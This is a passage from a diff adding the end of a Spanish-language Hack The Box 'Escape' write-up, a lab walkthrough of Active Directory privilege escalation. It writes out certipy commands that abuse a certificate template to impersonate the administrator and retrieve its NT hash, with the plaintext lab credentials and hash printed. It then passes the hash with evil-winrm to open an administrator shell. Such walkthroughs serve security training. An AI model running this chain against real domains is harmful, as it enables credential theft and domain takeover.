@@ -566,4 +566,87 @@ Template Name                       : UserAuthentication
 ```
 Para explotarla utilice el siguiente comando:
 
- 
+```bash 
+┌──(root㉿kali)-[/opt/]
+└─# certipy-ad -debug req -u 'Ryan.Cooper@sequel.htb' -p 'NuclearMosquito3' -template UserAuthentication -ca 'sequel-DC-CA' -dc-ip 10.10.11.202 -dc-host DC.sequel.htb -target DC.sequel.htb  -upn administrator@sequel.htb 
+
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[+] Nameserver: '10.10.11.202'
+[+] DC IP: '10.10.11.202'
+[+] DC Host: 'DC.sequel.htb'
+[+] Target IP: None
+[+] Remote Name: 'DC.sequel.htb'
+[+] Domain: 'SEQUEL.HTB'
+[+] Username: 'RYAN.COOPER'
+[+] Trying to resolve 'DC.sequel.htb' at '10.10.11.202'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.10.11.202[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.10.11.202[\pipe\cert]
+[*] Request ID is 13
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@sequel.htb'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[+] Attempting to write data to 'administrator.pfx'
+[+] Data written to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+```
+
+```bash
+┌──(root㉿kali)-[/opt/srp3rr1n.github.io/assets/images/htb-writeup-Escape]
+└─# certipy-ad auth -pfx administrator.pfx -domain sequel.htb -dc-ip 10.10.11.202
+
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@sequel.htb'
+[*] Using principal: 'administrator@sequel.htb'
+[*] Trying to get TGT...
+[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+[-] Use -debug to print a stacktrace
+[-] See the wiki for more information
+```
+En este punto tuve un error, para solucionarlo sincronice la hora de mi equipo con la hora del servidor
+
+```bash
+┌──(root㉿kali)-[/opt/]
+└─# ntpdate 10.10.11.202
+2025-08-16 22:48:02.123413 (-0400) +7224.782814 +/- 0.233653 10.10.11.202 s1 no-leap
+CLOCK: time stepped by 7224.782814
+```
+```bash
+┌──(root㉿kali)-[/opt/srp3rr1n.github.io/assets/images/htb-writeup-Escape]
+└─# certipy-ad auth -pfx administrator.pfx -domain sequel.htb -dc-ip 10.10.11.202
+
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@sequel.htb'
+[*] Using principal: 'administrator@sequel.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
+```
+Finalmente, me conecte al servidor usando el hash del administrador
+
+```bash
+┌──(root㉿kali)-[/opt/srp3rr1n.github.io/assets/images/htb-writeup-Escape]
+└─# evil-winrm -i 10.10.11.202 -u Administrator -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                   
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+sequel\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
